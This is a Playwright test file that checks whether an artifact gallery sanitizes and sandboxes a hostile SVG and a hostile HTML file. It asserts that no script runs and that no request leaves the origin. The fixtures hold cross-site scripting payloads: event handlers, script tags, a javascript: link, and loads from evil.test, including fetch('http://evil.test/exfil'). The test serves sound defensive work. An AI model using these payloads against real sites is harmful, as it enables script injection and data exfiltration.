import { expect, test, type Page } from "@playwright/test";

// The gallery against a mocked backend: a hostile SVG and a hostile HTML file are opened and
// the test asserts no script ran (window.__pwned stays unset) and nothing left the origin.

const RUN = "run-e2e";
const FILES = `/api/runs/${RUN}/artifact-files/`;

const MALICIOUS_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" ' +
  'onload="window.__pwned = 1">' +
  "<script>window.__pwned = 1</script>" +
  '<foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://evil.test/f"></iframe></foreignObject>' +
  '<image href="http://evil.test/x.png" width="10" height="10"/>' +
  '<a xlink:href="javascript:window.__pwned=1"><rect width="10" height="10" onclick="window.__pwned=1"/></a>' +
  '<circle cx="20" cy="20" r="8" fill="#336699"/></svg>';

const MALICIOUS_HTML =
  "<!doctype html><html><body><h1>hostile page</h1>" +
  "<script>window.__pwned = 1; fetch('http://evil.test/exfil')</script>" +
  '<img src="http://evil.test/pixel.png" onerror="window.__pwned = 1">' +
  "</body></html>";

// Same value as api/routes/run_artifacts.py: the mock must send what the real server sends.
const ACTIVE_CSP = "sandbox; default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:";
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64",
);

function signal(id: string, detail: Record<string, unknown>, at: string) {
  return {
    id, type: "ARTIFACT", summary: String(detail.path), detail: JSON.stringify(detail), from_agent: detail.role,
    priority: "normal", iteration: 0, timestamp: at,
  };
}

function artifact(id: string, path: string, kind: string, at: string, task: string | null = null) {
  return signal(id, {
    path, kind, role: "frontend", task_id: task, size: 1234, sha256: "0".repeat(64), created_at: at,
    served_path: `artifacts/frontend/${path}`,
  }, at);
}

const SNAPSHOT = {
  type: "snapshot",
  live: false,
  signals: [
    artifact("a1", "evil.svg", "svg", "2026-05-01T10:00:00+00:00"),
    artifact("a2", "evil.html", "html", "2026-05-01T11:00:00+00:00"),
    artifact("a3", "shot.png", "image", "2026-05-01T12:00:00+00:00", "T1"),
  ],
};

interface Spy {
  requests: string[];
  /** Requests to other origins that the browser issued (all are aborted by the guard below). */
  external: string[];
  /** Console messages, where Chromium reports CSP refusals. */
  console: string[];
}

async function mockBackend(page: Page, baseURL: string | undefined): Promise<Spy> {
  const spy: Spy = { requests: [], external: [], console: [] };
  page.on("console", (msg) => spy.console.push(msg.text()));
  const origin = new URL(baseURL ?? "http://127.0.0.1:4179").origin;
  page.on("request", (req) => {
    const url = req.url();
    spy.requests.push(url);
    if (!url.startsWith(origin) && !url.startsWith("data:") && !url.startsWith("blob:")) spy.external.push(url);
  });
  // Anything that is not the app's own origin is refused (and recorded above). With request
  // interception on, Chromium reports a request before it applies the page's CSP, so a
  // CSP-blocked fetch still appears in `external`; the console check below proves the CSP
  // refused it, and this guard proves nothing reached the network either way.
  await page.route((url) => url.origin !== origin && url.protocol.startsWith("http"), (route) => route.abort());

  await page.routeWebSocket(new RegExp(`/ws/runs/${RUN}$`), (ws) => {
    ws.send(JSON.stringify(SNAPSHOT));
  });
  await page.route(`**/api/runs/${RUN}/cards`, (route) =>
    route.fulfill({ json: { cards: [] } }),
  );
  await page.route(`**${FILES}**`, (route) => {
    const url = route.request().url();
    const nosniff = { "X-Content-Type-Options": "nosniff" };
    if (url.endsWith(".svg")) {
      return route.fulfill({ status: 200, contentType: "image/svg+xml", body: MALICIOUS_SVG, headers: { ...nosniff, "Content-Security-Policy": ACTIVE_CSP } });
    }
    if (url.endsWith(".html")) {
      return route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: MALICIOUS_HTML, headers: { ...nosniff, "Content-Security-Policy": ACTIVE_CSP } });
    }
    return route.fulfill({ status: 200, contentType: "image/png", body: PNG, headers: nosniff });
  });
  return spy;
}

async function pwned(page: Page): Promise<unknown> {
  return page.evaluate(() => (window as unknown as { __pwned?: unknown }).__pwned);
}

test("lists artifacts newest first", async ({ page, baseURL }) => {
  await mockBackend(page, baseURL);
  await page.goto(`/runs/${RUN}/artifacts`);
  const tiles = page.getByTestId("artifact-tile");
  await expect(tiles).toHaveCount(3);
  await expect(tiles.nth(0)).toContainText("shot.png");
  await expect(tiles.nth(2)).toContainText("evil.svg");
});

test("a malicious SVG is sanitized: no script runs and nothing leaves the origin", async ({ page, baseURL }) => {
  const spy = await mockBackend(page, baseURL);
  await page.goto(`/runs/${RUN}/artifacts`);
  await page.getByRole("button", { name: /Open evil\.svg/ }).click();

  const img = page.getByRole("dialog").getByAltText("evil.svg");
  await expect(img).toBeVisible();
  expect(await img.getAttribute("src")).toMatch(/^blob:/);
  // The image decoded, so the sanitized SVG is valid and the circle survived.
  await expect.poll(() => img.evaluate((el: HTMLImageElement) => el.naturalWidth)).toBeGreaterThan(0);
  expect(await page.getByRole("dialog").locator("svg[width='40']").count()).toBe(0); // never inline

  await page.waitForTimeout(300);
  expect(await pwned(page)).toBeUndefined();
  expect(spy.external).toEqual([]);
});

test("a malicious HTML file stays in an empty-sandbox frame: no script, no network", async ({ page, baseURL }) => {
  const spy = await mockBackend(page, baseURL);
  await page.goto(`/runs/${RUN}/artifacts`);
  await page.getByRole("button", { name: /Open evil\.html/ }).click();

  const frame = page.locator("iframe[title='evil.html']");
  await expect(frame).toBeVisible();
  expect(await frame.getAttribute("sandbox")).toBe("");
  await expect(page.frameLocator("iframe[title='evil.html']").locator("h1")).toHaveText("hostile page");

  await page.waitForTimeout(300);
  expect(await pwned(page)).toBeUndefined();
  const inner = await (await frame.elementHandle())!.contentFrame();
  expect(await inner!.evaluate(() => (window as unknown as { __pwned?: unknown }).__pwned)).toBeUndefined();
  // The frame's CSP refused the hostile image, and no script reached the exfil URL.
  expect(spy.console.join("\n")).toMatch(/Refused to load the image 'http:\/\/evil\.test\/pixel\.png'/);
  expect(spy.external.filter((u) => u.includes("exfil"))).toEqual([]);
});

test("opened directly, the served SVG and HTML are sandboxed by their CSP header", async ({ page, baseURL }) => {
  const spy = await mockBackend(page, baseURL);
  for (const name of ["evil.svg", "evil.html"]) {
    await page.goto(`${FILES}artifacts/frontend/${name}`);
    await page.waitForTimeout(300);
    expect(await pwned(page)).toBeUndefined();
  }
  expect(spy.console.join("\n")).toMatch(/Refused to load the image 'http:\/\/evil\.test\/(pixel|x)\.png'/);
  expect(spy.external.filter((u) => u.includes("exfil"))).toEqual([]);
});
